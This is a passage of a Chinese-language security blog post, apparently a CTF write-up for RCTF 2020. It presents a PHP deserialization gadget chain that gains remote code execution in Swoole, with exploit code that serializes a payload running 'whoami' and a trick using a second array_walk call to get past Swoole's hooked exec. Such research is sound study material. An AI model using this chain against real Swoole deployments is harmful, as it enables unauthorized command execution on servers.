+<h3 id="Second-Gadgets–RCE"><a href="#Second-Gadgets–RCE" class="headerlink" title="Second Gadgets–RCE"></a>Second Gadgets–RCE</h3><h4 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$o = <span class="keyword">new</span> Swoole\Curl\Handlep(<span class="string">"http://google.com/"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_READFUNCTION,<span class="string">"array_walk"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_FILE, <span class="string">"array_walk"</span>);</span><br><span class="line">$o-&gt;exec = <span class="keyword">array</span>(<span class="string">'whoami'</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_POSTFIELDS,<span class="string">"aaa"</span>);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_HTTPHEADER,[<span class="string">"Content-type"</span>=&gt;<span class="string">"application/json"</span>]);</span><br><span class="line">$o-&gt;setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);</span><br><span class="line"></span><br><span class="line">$a = serialize([$o,<span class="string">'exec'</span>]);</span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">"Handlep"</span>,<span class="string">"Handler"</span>,urlencode(process_serialized($a)));</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Analyisis"><a href="#Analyisis" class="headerlink" title="Analyisis"></a>Analyisis</h4><p>主要是从寻找任意类的无参函数的调用开始有所区别</p>
+<p>这RCE这条链中主要是对于这种形式如 Func($this,$var,$num)的fuzz。</p>
+<p>大概如下</p>
+<p><img src="https://s1.ax1x.com/2020/09/09/w1RTOg.png" alt="w1RTOg.png"></p>
+<p>​    这里主要用到的是array_walk对Object的一些触发，具体demo如下：</p>
+<p><img src="https://s1.ax1x.com/2020/09/09/w1o3NQ.png" alt="w1o3NQ.png"></p>
+<p>所以正常情况下我们只需要设置下exec就可以完成命令执行了</p>
+<p>但是在swoole中的exec调用并不是真正的exec，实际上调用的是hook后的swoole_exec</p>
+<p><a href="https://github.com/swoole/swoole-src/blob/f1a66611d8779114afbb0638d18c528689194ac8/swoole_runtime.cc#L1270" target="_blank" rel="noopener">https://github.com/swoole/swoole-src/blob/f1a66611d8779114afbb0638d18c528689194ac8/swoole_runtime.cc#L1270</a></p>
+<p>在发生错误时会直接产生Fatal Error，终止运行。</p>
+<p>可以通过如下方法来bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array_walk($this, array_walk, 1);</span><br><span class="line">$this-&gt;exec&#x3D;array(&quot;id&quot;)</span><br><span class="line"></span><br><span class="line">调用&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">array_walk($client_value,&quot;client&quot;,1)&#x3D;&gt;callback not found &#x3D;&gt; warning</span><br><span class="line"></span><br><span class="line">array_walk(array(&quot;id&quot;),&quot;exec&quot;,1)&#x3D;&gt; finish RCE</span><br></pre></td></tr></table></figure>
+
+<h4 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h4><p>1.array_walk也可以遍历对象来进行函数调用</p>
+<p>2.二次array_walk bypass swoole_exec</p>
+<h3 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h3><p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole</a></p>
+<p><a href="https://blog.sometimenaive.com/2020/06/04/rctf-2020-swoole-writeup/" target="_blank" rel="noopener">https://blog.sometimenaive.com/2020/06/04/rctf-2020-swoole-writeup/</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="http://yoursite.com/2020/09/09/Swoole-deserialization-Gadgets/" data-id="ckev2t0j50000ypre1m7xeet9" class="article-share-link" data-share="baidu" data-title="Swoole deserialization Gadgets">Share</a>
+      
+
+      
+
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Swoole/" rel="tag">Swoole</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/08/09/ysoserial-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ysoserial-调试分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      
+      <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DOM-Clobbering-Attack/" rel="tag">DOM Clobbering Attack</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JSONP/" rel="tag">JSONP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Javascript/" rel="tag">Javascript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E6%AD%A3%E5%88%99%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" rel="tag">PHP正则安全研究</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Swoole/" rel="tag">Swoole</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Variable-hijacking/" rel="tag">Variable hijacking</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/intigriti-Easter/" rel="tag">intigriti Easter</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" rel="tag">前端安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93/" rel="tag">浏览器渲染</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E5%9F%9F/" rel="tag">跨域</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/DOM-Clobbering-Attack/" style="font-size: 10px;">DOM Clobbering Attack</a> <a href="/tags/JSONP/" style="font-size: 10px;">JSONP</a> <a href="/tags/Javascript/" style="font-size: 10px;">Javascript</a> <a href="/tags/PHP%E6%AD%A3%E5%88%99%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" style="font-size: 10px;">PHP正则安全研究</a> <a href="/tags/Swoole/" style="font-size: 10px;">Swoole</a> <a href="/tags/Variable-hijacking/" style="font-size: 10px;">Variable hijacking</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/intigriti-Easter/" style="font-size: 10px;">intigriti Easter</a> <a href="/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/" style="font-size: 10px;">前端安全</a> <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93/" style="font-size: 10px;">浏览器渲染</a> <a href="/tags/%E8%B7%A8%E5%9F%9F/" style="font-size: 10px;">跨域</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/09/09/Swoole-deserialization-Gadgets/">Swoole deserialization Gadgets</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/09/ysoserial-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/">ysoserial-调试分析</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Links</h3>
+    <div class="widget">
+      <ul>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+      
+    </div>
+    <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 离怀秋<br>
+      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
+      .
+      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
+    </div>
+  </div>
+</footer>
+  </div>
+  <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+  <!-- totop start -->
+<div id="totop">
+<a title="totop"><img src="/img/scrollup.png"/></a>
+</div>
+
+<!-- totop end -->
+
+
+<!-- 百度分享 start -->
+
+<div id="article-share-box" class="article-share-box">
+  <div id="bdshare" class="bdsharebuttonbox article-share-links">
+    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
+    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
+    <a class="article-share-more" data-cmd="more" title="更多"></a>
+  </div>
+</div>
+<script>
+  function SetShareData(cmd, config) {
+    if (shareDataTitle && shareDataUrl) {
+      config.bdText = shareDataTitle;
+      config.bdUrl = shareDataUrl;
+    }
+    return config;
+  }
+  window._bd_share_config={
+    "common":{onBeforeClick: SetShareData},
+    "share":{"bdCustomStyle":"/css/bdshare.css"}
+  };
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+<!-- 百度分享 end -->
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+</div>
+</body>
+</html>
